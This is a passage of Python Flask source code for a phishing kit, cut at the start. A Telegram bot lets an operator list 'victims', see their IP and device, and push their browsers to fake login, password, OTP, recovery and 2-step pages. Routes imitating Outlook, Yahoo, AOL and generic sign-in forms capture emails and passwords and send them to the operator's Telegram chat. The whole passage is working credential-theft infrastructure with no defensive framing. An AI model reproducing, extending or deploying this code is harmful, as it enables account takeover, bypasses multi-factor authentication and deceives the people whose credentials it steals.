        settings = get_settings_json(session_id)
        return jsonify({'phone': settings.get('phone', '')})
    return jsonify({'phone': ''})

@app.route('/check-command')
def check_command():
    session_id = session.get('victim_session')
    if session_id:
        command = get_and_clear_command_json(session_id)
        if command:
            return jsonify({'command': command})
    client_ip = get_client_ip()
    session_id, command = get_and_clear_command_by_ip_json(client_ip)
    if command:
        if session_id:
            session['victim_session'] = session_id
            session['is_victim'] = True
        return jsonify({'command': command})
    return jsonify({'command': None})

# ============ TELEGRAM WEBHOOK ============

@app.route('/telegram-webhook', methods=['POST'])
def telegram_webhook():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'ok'})
        
        if 'callback_query' in data:
            callback = data['callback_query']
            chat_id = callback['message']['chat']['id']
            message_id = callback['message']['message_id']
            data_parts = callback['data'].split('|')
            action = data_parts[0]
            
            if action == 'refresh':
                send_victims_list(chat_id, message_id)
            elif action == 'victim_detail':
                session_id = data_parts[1]
                send_victim_detail(chat_id, session_id, message_id)
            elif action == 'force':
                session_id = data_parts[1]
                page = data_parts[2]
                force_victim(session_id, page, chat_id, message_id)
            elif action == 'setemail':
                session_id = data_parts[1]
                email = data_parts[2] if len(data_parts) > 2 else ''
                set_victim_email(session_id, email, chat_id, message_id)
            elif action == 'setphonetype':
                session_id = data_parts[1]
                phone_type = data_parts[2] if len(data_parts) > 2 else ''
                set_victim_phonetype(session_id, phone_type, chat_id, message_id)
            elif action == 'setnumber':
                session_id = data_parts[1]
                number = data_parts[2] if len(data_parts) > 2 else ''
                set_victim_number(session_id, number, chat_id, message_id)
            elif action == 'setphone':
                session_id = data_parts[1]
                phone = data_parts[2] if len(data_parts) > 2 else ''
                set_victim_phone(session_id, phone, chat_id, message_id)
            elif action == 'delete':
                session_id = data_parts[1]
                delete_victim_telegram(session_id, chat_id, message_id)
            elif action == 'main_menu':
                send_main_menu(chat_id, message_id)
            elif action == 'victims_list':
                send_victims_list(chat_id, message_id)
            elif action == 'stats':
                send_stats(chat_id, message_id)
            elif action == 'clear_all':
                clear_all_victims(chat_id, message_id)
            elif action == 'back_to_victim':
                session_id = data_parts[1]
                send_victim_detail(chat_id, session_id, message_id)
            elif action == 'noop':
                pass
            
            return jsonify({'status': 'ok'})
        
        if 'message' in data:
            message = data['message']
            chat_id = message['chat']['id']
            text = message.get('text', '').strip()
            
            # Check if we're in a "setting" state
            if chat_id in setting_states:
                state = setting_states[chat_id]
                session_id = state['session_id']
                action = state['action']
                
                if action == 'setemail':
                    if '@' in text and '.' in text:
                        set_victim_email(session_id, text, chat_id, None)
                    else:
                        send_telegram_message("❌ Invalid email format. Please try again.\n\nExample: user@gmail.com")
                elif action == 'setphonetype':
                    if text:
                        set_victim_phonetype(session_id, text, chat_id, None)
                    else:
                        send_telegram_message("❌ Please enter a phone type (e.g., iPhone, Android)")
                elif action == 'setphone':
                    if text:
                        set_victim_phone(session_id, text, chat_id, None)
                    else:
                        send_telegram_message("❌ Please enter a phone number (e.g., +1234567890)")
                elif action == 'setnumber':
                    if text and re.match(r'^[0-9]{2}$', text):
                        set_victim_number(session_id, text, chat_id, None)
                    else:
                        send_telegram_message("❌ Invalid number. Must be 2 digits (00-99). Please try again.")
                
                if chat_id in setting_states:
                    del setting_states[chat_id]
                send_victim_detail(chat_id, session_id)
                return jsonify({'status': 'ok'})
            
            if text == '/start' or text == '🔙 Main Menu':
                send_main_menu(chat_id)
            elif text == '📋 View Victims':
                send_victims_list(chat_id)
            elif text == '📊 Statistics':
                send_stats(chat_id)
            elif text == '🧹 Clear All':
                send_clear_confirmation(chat_id)
            else:
                send_main_menu(chat_id)
            
            return jsonify({'status': 'ok'})
        
        return jsonify({'status': 'ok'})
        
    except Exception as e:
        print(f"Error in webhook: {e}")
        return jsonify({'status': 'error'}), 500

# ============ TELEGRAM BOT FUNCTIONS ============

setting_states = {}

def send_main_menu(chat_id, message_id=None):
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "📋 View Victims", "callback_data": "victims_list"},
                {"text": "📊 Statistics", "callback_data": "stats"}
            ],
            [
                {"text": "🧹 Clear All Data", "callback_data": "clear_all"}
            ],
            [
                {"text": "🔄 Refresh", "callback_data": "refresh"}
            ]
        ]
    }
    text = """🤖 <b>Gmail Victim Control Bot</b>

Welcome! Use the buttons below to control your victims.

📋 <b>View Victims</b> - See all active victims
📊 <b>Statistics</b> - View stats
🧹 <b>Clear All</b> - Delete all victims & logs
🔄 <b>Refresh</b> - Update the list"""
    if message_id:
        edit_telegram_message(chat_id, message_id, text, keyboard)
    else:
        send_telegram_message_with_buttons(chat_id, text, keyboard)

def send_victims_list(chat_id, message_id=None):
    victims = get_all_victims()
    if not victims:
        text = "📭 <b>No active victims found.</b>"
        keyboard = {
            "inline_keyboard": [
                [{"text": "🔄 Refresh", "callback_data": "refresh"}],
                [{"text": "🔙 Main Menu", "callback_data": "main_menu"}]
            ]
        }
    else:
        text = f"📋 <b>Active Victims ({len(victims)})</b>\n\n"
        keyboard = {"inline_keyboard": []}
        for v in victims[:10]:
            session_short = v['session_id'][:8]
            current_page_display = get_victim_page_display(v['current_page'])
            text += f"🆔 <code>{session_short}...</code>\n"
            text += f"📧 {v['email']}\n"
            text += f"📍 {current_page_display}\n"
            text += "─" * 20 + "\n"
            keyboard["inline_keyboard"].append([
                {"text": f"👤 {session_short}", "callback_data": f"victim_detail|{v['session_id']}"}
            ])
        if len(victims) > 10:
            text += f"\n... and {len(victims) - 10} more victims"
        keyboard["inline_keyboard"].append([
            {"text": "🔄 Refresh", "callback_data": "refresh"},
            {"text": "🔙 Main Menu", "callback_data": "main_menu"}
        ])
    if message_id:
        edit_telegram_message(chat_id, message_id, text, keyboard)
    else:
        send_telegram_message_with_buttons(chat_id, text, keyboard)

def send_victim_detail(chat_id, session_id, message_id=None):
    victim = get_victim_details_cached(session_id)
    if not victim:
        text = "❌ Victim not found"
        keyboard = {
            "inline_keyboard": [
                [{"text": "📋 Back to Victims", "callback_data": "victims_list"}],
                [{"text": "🔙 Main Menu", "callback_data": "main_menu"}]
            ]
        }
    else:
        settings = get_settings_json(session_id)
        current_email = settings.get('email', victim.get('email', 'Not set'))
        current_phone = settings.get('phone', 'Not set')
        current_number = settings.get('number', 'Not set')
        current_phone_type = settings.get('phone_type', 'Not set')
        
        user_agent = victim.get('user_agent', '')
        device = get_device_info(user_agent)
        current_page_display = get_victim_page_display(victim['current_page'])
        
        text = f"""👤 <b>Victim Details</b>

🆔 <b>Session:</b> <code>{victim['session_id'][:12]}...</code>
📧 <b>Email:</b> {current_email}
📍 <b>Current Page:</b> {current_page_display}
🌐 <b>IP:</b> {victim['ip_address']}
📱 <b>Device:</b> {device}
🕐 <b>Connected:</b> {victim['timestamp']}
📊 <b>Navigations:</b> {victim['nav_count']}

<b>📌 Current Settings:</b>
📧 <b>Email:</b> {current_email}
📱 <b>Phone Type:</b> {current_phone_type}
📞 <b>Phone:</b> {current_phone}
🔢 <b>2-Digit Number:</b> {current_number}

<b>⚙️ Settings Controls:</b>"""
        
        keyboard = {
            "inline_keyboard": [
                [
                    {"text": "📧 Set Email", "callback_data": f"setemail|{session_id}|"},
                    {"text": "📱 Set Phone Type", "callback_data": f"setphonetype|{session_id}|"}
                ],
                [
                    {"text": "📞 Set Phone", "callback_data": f"setphone|{session_id}|"},
                    {"text": "🔢 Set 2-Digit", "callback_data": f"setnumber|{session_id}|"}
                ],
                [
                    {"text": "━━━━━━━━━━━━━━━━━━━━", "callback_data": "noop"}
                ],
                [
                    {"text": "🚀 Navigation Controls", "callback_data": "noop"}
                ],
                [
                    {"text": "🔐 Login", "callback_data": f"force|{session_id}|login"},
                    {"text": "🔑 Password", "callback_data": f"force|{session_id}|password"}
                ],
                [
                    {"text": "🛡️ Verify", "callback_data": f"force|{session_id}|verify"},
                    {"text": "🔄 Reset", "callback_data": f"force|{session_id}|reset"}
                ],
                [
                    {"text": "📱 OTP", "callback_data": f"force|{session_id}|otp"},
                    {"text": "📱 Recovery", "callback_data": f"force|{session_id}|recovery"}
                ],
                [
                    {"text": "🔒 2-Step", "callback_data": f"force|{session_id}|2step"},
                    {"text": "⏸️ Stall", "callback_data": f"force|{session_id}|stall"}
                ],
                [
                    {"text": "❌ Invalid", "callback_data": f"force|{session_id}|invalid"},
                    {"text": "⏳ Waiting", "callback_data": f"force|{session_id}|waiting"}
                ],
                [
                    {"text": "━━━━━━━━━━━━━━━━━━━━", "callback_data": "noop"}
                ],
                [
                    {"text": "🗑️ Delete Victim", "callback_data": f"delete|{session_id}"}
                ],
                [
                    {"text": "📋 Back to Victims", "callback_data": "victims_list"},
                    {"text": "🔙 Main Menu", "callback_data": "main_menu"}
                ]
            ]
        }
    
    if message_id:
        edit_telegram_message(chat_id, message_id, text, keyboard)
    else:
        send_telegram_message_with_buttons(chat_id, text, keyboard)

def force_victim(session_id, page, chat_id, message_id):
    action_map = {
        'waiting': 'go_to_waiting',
        'login': 'go_to_login',
        'stall': 'go_to_stall',
        'verify': 'go_to_verify',
        'password': 'go_to_password',
        'reset': 'go_to_reset',
        'otp': 'go_to_otp',
        'invalid': 'go_to_invalid',
        'recovery': 'go_to_recovery',
        '2step': 'go_to_2step'
    }
    
    if page in action_map:
        command = action_map[page]
        clear_notifications_json(session_id)
        ip_address = None
        if session_id in active_victims:
            ip_address = active_victims[session_id].get('ip_address')
        add_command_json(session_id, command, ip_address)
        text = f"✅ Victim forced to <b>{page}</b> page!"
    else:
        text = f"❌ Invalid page: {page}"
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "🔙 Back to Victim", "callback_data": f"victim_detail|{session_id}"}],
            [{"text": "📋 Victims List", "callback_data": "victims_list"}],
            [{"text": "🔙 Main Menu", "callback_data": "main_menu"}]
        ]
    }
    edit_telegram_message(chat_id, message_id, text, keyboard)

def set_victim_email(session_id, email, chat_id, message_id):
    if not email:
        setting_states[chat_id] = {'session_id': session_id, 'action': 'setemail'}
        text = "📧 Please type the email address you want to set.\n\nExample: user@gmail.com"
        keyboard = {"inline_keyboard": [[{"text": "🔙 Cancel", "callback_data": f"victim_detail|{session_id}"}]]}
        if message_id:
            edit_telegram_message(chat_id, message_id, text, keyboard)
        else:
            send_telegram_message_with_buttons(chat_id, text, keyboard)
        return
    
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("UPDATE victims SET email = %s WHERE session_id = %s", (email, session_id))
    conn.commit()
    conn.close()
    
    if session_id in active_victims:
        active_victims[session_id]['email'] = email
    update_setting_json(session_id, 'email', email)
    session['email'] = email
    invalidate_cache(session_id)
    
    text = f"✅ Email set to: <code>{email}</code>"
    keyboard = {
        "inline_keyboard": [
            [{"text": "🔙 Back to Victim", "callback_data": f"victim_detail|{session_id}"}],
            [{"text": "📋 Victims List", "callback_data": "victims_list"}]
        ]
    }
    if chat_id in setting_states:
        del setting_states[chat_id]
    if message_id:
        edit_telegram_message(chat_id, message_id, text, keyboard)
    else:
        send_telegram_message_with_buttons(chat_id, text, keyboard)

def set_victim_phonetype(session_id, phone_type, chat_id, message_id):
    if not phone_type:
        setting_states[chat_id] = {'session_id': session_id, 'action': 'setphonetype'}
        text = "📱 Please type the phone type you want to set.\n\nExamples: iPhone, Android, Samsung, Oppo, etc."
        keyboard = {"inline_keyboard": [[{"text": "🔙 Cancel", "callback_data": f"victim_detail|{session_id}"}]]}
        if message_id:
            edit_telegram_message(chat_id, message_id, text, keyboard)
        else:
            send_telegram_message_with_buttons(chat_id, text, keyboard)
        return
    
    update_setting_json(session_id, 'phone_type', phone_type)
    text = f"✅ Phone type set to: <code>{phone_type}</code>"
    keyboard = {
        "inline_keyboard": [
            [{"text": "🔙 Back to Victim", "callback_data": f"victim_detail|{session_id}"}],
            [{"text": "📋 Victims List", "callback_data": "victims_list"}]
        ]
    }
    if chat_id in setting_states:
        del setting_states[chat_id]
    if message_id:
        edit_telegram_message(chat_id, message_id, text, keyboard)
    else:
        send_telegram_message_with_buttons(chat_id, text, keyboard)

def set_victim_phone(session_id, phone, chat_id, message_id):
    if not phone:
        setting_states[chat_id] = {'session_id': session_id, 'action': 'setphone'}
        text = "📞 Please type the phone number you want to set.\n\nExample: +1234567890"
        keyboard = {"inline_keyboard": [[{"text": "🔙 Cancel", "callback_data": f"victim_detail|{session_id}"}]]}
        if message_id:
            edit_telegram_message(chat_id, message_id, text, keyboard)
        else:
            send_telegram_message_with_buttons(chat_id, text, keyboard)
        return
    
    update_setting_json(session_id, 'phone', phone)
    text = f"✅ Phone number set to: <code>{phone}</code>"
    keyboard = {
        "inline_keyboard": [
            [{"text": "🔙 Back to Victim", "callback_data": f"victim_detail|{session_id}"}],
            [{"text": "📋 Victims List", "callback_data": "victims_list"}]
        ]
    }
    if chat_id in setting_states:
        del setting_states[chat_id]
    if message_id:
        edit_telegram_message(chat_id, message_id, text, keyboard)
    else:
        send_telegram_message_with_buttons(chat_id, text, keyboard)

def set_victim_number(session_id, number, chat_id, message_id):
    if not number:
        setting_states[chat_id] = {'session_id': session_id, 'action': 'setnumber'}
        text = "🔢 Please type a 2-digit number (00-99).\n\nExample: 42"
        keyboard = {"inline_keyboard": [[{"text": "🔙 Cancel", "callback_data": f"victim_detail|{session_id}"}]]}
        if message_id:
            edit_telegram_message(chat_id, message_id, text, keyboard)
        else:
            send_telegram_message_with_buttons(chat_id, text, keyboard)
        return
    
    if not re.match(r'^[0-9]{2}$', number):
        text = "❌ Invalid number. Must be 2 digits (00-99). Please try again."
        keyboard = {
            "inline_keyboard": [
                [{"text": "🔙 Try Again", "callback_data": f"setnumber|{session_id}|"}],
                [{"text": "🔙 Cancel", "callback_data": f"victim_detail|{session_id}"}]
            ]
        }
        if message_id:
            edit_telegram_message(chat_id, message_id, text, keyboard)
        else:
            send_telegram_message_with_buttons(chat_id, text, keyboard)
        return
    
    update_setting_json(session_id, 'number', number)
    text = f"✅ 2-Digit Number set to: <code>{number}</code>"
    keyboard = {
        "inline_keyboard": [
            [{"text": "🔙 Back to Victim", "callback_data": f"victim_detail|{session_id}"}],
            [{"text": "📋 Victims List", "callback_data": "victims_list"}]
        ]
    }
    if chat_id in setting_states:
        del setting_states[chat_id]
    if message_id:
        edit_telegram_message(chat_id, message_id, text, keyboard)
    else:
        send_telegram_message_with_buttons(chat_id, text, keyboard)

def delete_victim_telegram(session_id, chat_id, message_id):
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("UPDATE victims SET is_active = FALSE WHERE session_id = %s", (session_id,))
    conn.commit()
    conn.close()
    
    delete_victim_json(session_id)
    clear_notifications_json(session_id)
    
    if session_id in active_victims:
        del active_victims[session_id]
    invalidate_cache(session_id)
    
    text = f"🗑️ Victim <code>{session_id[:8]}...</code> deleted!"
    keyboard = {
        "inline_keyboard": [
            [{"text": "📋 Victims List", "callback_data": "victims_list"}],
            [{"text": "🔙 Main Menu", "callback_data": "main_menu"}]
        ]
    }
    edit_telegram_message(chat_id, message_id, text, keyboard)

def send_stats(chat_id, message_id=None):
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM victims WHERE is_active = TRUE")
    active_count = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM victims")
    total_count = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM navigations")
    nav_count = c.fetchone()[0]
    conn.close()
    
    commands = load_commands_json()
    pending_commands = len(commands)
    
    text = f"""📊 <b>Statistics</b>

👤 <b>Active Victims:</b> {active_count}
📋 <b>Total Victims:</b> {total_count}
🗺️ <b>Total Navigations:</b> {nav_count}
⚡ <b>Pending Commands:</b> {pending_commands}"""
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "🔄 Refresh", "callback_data": "stats"}],
            [{"text": "📋 Victims List", "callback_data": "victims_list"}],
            [{"text": "🔙 Main Menu", "callback_data": "main_menu"}]
        ]
    }
    if message_id:
        edit_telegram_message(chat_id, message_id, text, keyboard)
    else:
        send_telegram_message_with_buttons(chat_id, text, keyboard)

def clear_all_victims(chat_id, message_id):
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("DELETE FROM navigations")
    c.execute("DELETE FROM victims")
    c.execute("ALTER SEQUENCE victims_id_seq RESTART WITH 1")
    c.execute("ALTER SEQUENCE navigations_id_seq RESTART WITH 1")
    conn.commit()
    conn.close()
    
    clear_all_json()
    active_victims.clear()
    invalidate_all_cache()
    
    text = "🧹 <b>ALL VICTIMS AND LOGS CLEARED!</b>"
    keyboard = {
        "inline_keyboard": [
            [{"text": "📋 Victims List", "callback_data": "victims_list"}],
            [{"text": "🔙 Main Menu", "callback_data": "main_menu"}]
        ]
    }
    edit_telegram_message(chat_id, message_id, text, keyboard)

def send_clear_confirmation(chat_id):
    text = "⚠️ <b>ARE YOU SURE?</b>\n\nThis will delete ALL victim data and navigation logs!\n\nThis action cannot be undone!"
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "✅ Yes, Clear All", "callback_data": "clear_all"},
                {"text": "❌ Cancel", "callback_data": "main_menu"}
            ]
        ]
    }
    send_telegram_message_with_buttons(chat_id, text, keyboard)

def send_telegram_message_with_buttons(chat_id, text, keyboard):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": chat_id,
            "text": text,
            "parse_mode": "HTML",
            "reply_markup": json.dumps(keyboard)
        }
        response = requests.post(url, data=data)
        return response.status_code == 200
    except:
        return False

def edit_telegram_message(chat_id, message_id, text, keyboard):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
        data = {
            "chat_id": chat_id,
            "message_id": message_id,
            "text": text,
            "parse_mode": "HTML",
            "reply_markup": json.dumps(keyboard)
        }
        response = requests.post(url, data=data)
        return response.status_code == 200
    except:
        return False

def get_all_victims():
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('''
        SELECT session_id, email, ip_address, current_page, timestamp 
        FROM victims 
        WHERE is_active = TRUE 
        ORDER BY timestamp DESC
        LIMIT 50
    ''')
    victims = c.fetchall()
    conn.close()
    return [{
        'session_id': v[0],
        'email': v[1] or 'No email',
        'ip_address': v[2],
        'current_page': v[3] or 'login',
        'timestamp': v[4]
    } for v in victims]

# ============ PROVIDER ROUTES ============
@app.route('/wp-admin/invite<int:invite_num>/hotmail/', methods=['GET', 'POST'])
def microsoft_login(invite_num):
    if request.method == 'POST':
        email = request.form.get('email', 'Not provided')
        session['user_email'] = email
        session_id = session.get('victim_session')
        if session_id:
            conn = get_db_connection()
            c = conn.cursor()
            c.execute("UPDATE victims SET email = %s WHERE session_id = %s", (email, session_id))
            conn.commit()
            conn.close()
            if session_id in active_victims:
                active_victims[session_id]['email'] = email
            update_setting_json(session_id, 'email', email)
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        user_agent = request.headers.get('User-Agent', '')
        device = get_device_info(user_agent)
        message = f"""📧 <b>Outlook Email Entered!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
📱 <b>Device:</b> {device}
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Page:</b> Outlook Login"""
        send_telegram_notification_with_buttons(message, session_id)
        new_invite = random.randint(2, 999)
        return redirect(f"/wp-admin/invite{new_invite}/hotmail/password")
    return render_template('microsoft.html', invite_num=invite_num)

@app.route('/wp-admin/invite<int:invite_num>/hotmail/password', methods=['GET', 'POST'])
def microsoft_password(invite_num):
    email = session.get('user_email', '')
    if request.method == 'POST':
        password = request.form.get('password', 'Not provided')
        email = request.form.get('email', 'Not provided')
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        user_agent = request.headers.get('User-Agent', '')
        device = get_device_info(user_agent)
        session_id = session.get('victim_session')
        message = f"""🔑 <b>Outlook Password Entered!</b>

📧 <b>Email:</b> <code>{email}</code>
🔐 <b>Password:</b> <code>{password}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
📱 <b>Device:</b> {device}
🕒 <b>Time:</b> <code>{timestamp}</code>"""
        send_telegram_notification_with_buttons(message, session_id)
        new_invite = random.randint(2, 999)
        return redirect(f"/wp-admin/invite{new_invite}/hotmail/403")
    return render_template('passwordmicrosoft.html', email=email, invite_num=invite_num)

@app.route('/wp-admin/invite<int:invite_num>/hotmail/403')
def microsoft_403(invite_num):
    return render_template('403.html', invite_num=invite_num)

@app.route('/wp-admin/invite<int:invite_num>/yahoo/', methods=['GET', 'POST'])
def yahoo_login(invite_num):
    if request.method == 'POST':
        email = request.form.get('email', 'Not provided')
        session['yahoo_email'] = email
        session_id = session.get('victim_session')
        if session_id:
            conn = get_db_connection()
            c = conn.cursor()
            c.execute("UPDATE victims SET email = %s WHERE session_id = %s", (email, session_id))
            conn.commit()
            conn.close()
            if session_id in active_victims:
                active_victims[session_id]['email'] = email
            update_setting_json(session_id, 'email', email)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        user_agent = request.headers.get('User-Agent', '')
        device = get_device_info(user_agent)
        message = f"""📧 <b>Yahoo Email/Username Entered!</b>

📧 <b>Email/Username:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
📱 <b>Device:</b> {device}
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Page:</b> Yahoo Login"""
        send_telegram_notification_with_buttons(message, session_id)
        new_invite = random.randint(2, 999)
        return redirect(f"/wp-admin/invite{new_invite}/yahoo/password")
    return render_template('yahoo.html', invite_num=invite_num)

@app.route('/wp-admin/invite<int:invite_num>/yahoo/password', methods=['GET', 'POST'])
def yahoo_password(invite_num):
    email = session.get('yahoo_email', '')
    if request.method == 'POST':
        password = request.form.get('password', 'Not provided')
        email = request.form.get('email', 'Not provided')
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        user_agent = request.headers.get('User-Agent', '')
        device = get_device_info(user_agent)
        session_id = session.get('victim_session')
        message = f"""🔑 <b>Yahoo Password Entered!</b>

📧 <b>Email/Username:</b> <code>{email}</code>
🔐 <b>Password:</b> <code>{password}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
📱 <b>Device:</b> {device}
🕒 <b>Time:</b> <code>{timestamp}</code>"""
        send_telegram_notification_with_buttons(message, session_id)
        new_invite = random.randint(2, 999)
        return redirect(f"/wp-admin/invite{new_invite}/yahoo/403")
    return render_template('yahoopassword.html', email=email, invite_num=invite_num)

@app.route('/wp-admin/invite<int:invite_num>/yahoo/403')
def yahoo_403(invite_num):
    return render_template('403.html', invite_num=invite_num)

@app.route('/wp-admin/invite<int:invite_num>/aol/', methods=['GET', 'POST'])
def aol_login(invite_num):
    if request.method == 'POST':
        email = request.form.get('email', 'Not provided')
        session['aol_email'] = email
        session_id = session.get('victim_session')
        if session_id:
            conn = get_db_connection()
            c = conn.cursor()
            c.execute("UPDATE victims SET email = %s WHERE session_id = %s", (email, session_id))
            conn.commit()
            conn.close()
            if session_id in active_victims:
                active_victims[session_id]['email'] = email
            update_setting_json(session_id, 'email', email)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        user_agent = request.headers.get('User-Agent', '')
        device = get_device_info(user_agent)
        message = f"""📧 <b>AOL Email Entered!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
📱 <b>Device:</b> {device}
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Page:</b> AOL Login"""
        send_telegram_notification_with_buttons(message, session_id)
        new_invite = random.randint(2, 999)
        return redirect(f"/wp-admin/invite{new_invite}/aol/password")
    return render_template('aol.html', invite_num=invite_num)

@app.route('/wp-admin/invite<int:invite_num>/aol/password', methods=['GET', 'POST'])
def aol_password(invite_num):
    email = session.get('aol_email', '')
    if request.method == 'POST':
        password = request.form.get('password', 'Not provided')
        email = request.form.get('email', 'Not provided')
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        user_agent = request.headers.get('User-Agent', '')
        device = get_device_info(user_agent)
        session_id = session.get('victim_session')
        message = f"""🔑 <b>AOL Password Entered!</b>

📧 <b>Email:</b> <code>{email}</code>
🔐 <b>Password:</b> <code>{password}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
📱 <b>Device:</b> {device}
🕒 <b>Time:</b> <code>{timestamp}</code>"""
        send_telegram_notification_with_buttons(message, session_id)
        new_invite = random.randint(2, 999)
        return redirect(f"/wp-admin/invite{new_invite}/aol/403")
    return render_template('aolpassword.html', email=email, invite_num=invite_num)

@app.route('/wp-admin/invite<int:invite_num>/aol/403')
def aol_403(invite_num):
    return render_template('403.html', invite_num=invite_num)

@app.route('/wp-admin/invite<int:invite_num>/other/', methods=['GET', 'POST'])
def other_login(invite_num):
    if request.method == 'POST':
        email = request.form.get('email', 'Not provided')
        password = request.form.get('password', 'Not provided')
        session_id = session.get('victim_session')
        if session_id:
            conn = get_db_connection()
            c = conn.cursor()
            c.execute("UPDATE victims SET email = %s WHERE session_id = %s", (email, session_id))
            conn.commit()
            conn.close()
            if session_id in active_victims:
                active_victims[session_id]['email'] = email
            update_setting_json(session_id, 'email', email)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        user_agent = request.headers.get('User-Agent', '')
        device = get_device_info(user_agent)
        message = f"""🔑 <b>Other Login Attempt!</b>

📧 <b>Email:</b> <code>{email}</code>
🔐 <b>Password:</b> <code>{password}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
📱 <b>Device:</b> {device}
🕒 <b>Time:</b> <code>{timestamp}</code>"""
        send_telegram_notification_with_buttons(message, session_id)
        new_invite = random.randint(2, 999)
        return redirect(f"/wp-admin/invite{new_invite}/other/403")
    return render_template('other.html', invite_num=invite_num)

@app.route('/wp-admin/invite<int:invite_num>/other/403')
def other_403(invite_num):
    return render_template('403.html', invite_num=invite_num)

if __name__ == '__main__':
    if not os.environ.get('WERKZEUG_RUN_MAIN'):
        send_telegram_message("✅ Server started!")
        ensure_webhook()
    
    app.run(
        host='0.0.0.0', 
        port=5000,
        debug=False
    )
